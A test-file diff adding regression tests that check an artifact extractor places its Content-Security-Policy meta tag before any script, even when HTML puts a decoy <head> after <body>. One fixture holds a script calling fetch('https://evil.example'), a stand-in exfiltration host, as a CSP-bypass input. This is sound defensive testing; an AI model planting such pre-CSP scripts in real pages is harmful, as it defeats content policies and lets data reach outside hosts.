@@ -264,6 +264,36 @@ describe("extractArtifacts — CSP meta position (architecture §3.2)", () => {
         expect(artifacts[0].code).not.toContain("Content-Security-Policy");
         expect(artifacts[0].document).toContain("Content-Security-Policy");
     });
+
+    // BLOCKER regression (security review): a decoy <head> after <body> must
+    // NOT let a <script> be parsed before the CSP meta (a meta-CSP is not
+    // retroactive, so a pre-meta fetch() would escape connect-src 'none').
+    it("keeps the CSP meta before any <script> despite a decoy <head> after <body>", () => {
+        const exploit =
+            "<html>\n<body>\n<script>fetch('https://evil.example')</script>\n</body>\n<head></head>\n</html>";
+        const doc = extractArtifacts(fence("html", exploit), meta)[0].document;
+        const cspIdx = doc.indexOf("Content-Security-Policy");
+        expect(cspIdx).toBeGreaterThanOrEqual(0);
+        expect(cspIdx).toBeLessThan(doc.indexOf("fetch('https://evil.example')"));
+        expect(cspIdx).toBeLessThan(doc.search(/<body[\s>]/i));
+    });
+
+    it("keeps the CSP meta before a <script> placed ahead of the <head>", () => {
+        const exploit =
+            "<html><script>window.x=1</script><head><title>t</title></head><body></body></html>";
+        const doc = extractArtifacts(fence("html", exploit), meta)[0].document;
+        expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(
+            doc.indexOf("window.x=1"),
+        );
+    });
+
+    it("wraps a fragment with content before <html> so nothing runs pre-CSP", () => {
+        const exploit = "<script>window.y=2</script><html><body></body></html>";
+        const doc = extractArtifacts(fence("html", exploit), meta)[0].document;
+        expect(doc.indexOf("Content-Security-Policy")).toBeLessThan(
+            doc.indexOf("window.y=2"),
+        );
+    });
 });
 
 describe("extractArtifacts — runtime bridge (error + external-link postMessage)", () => {
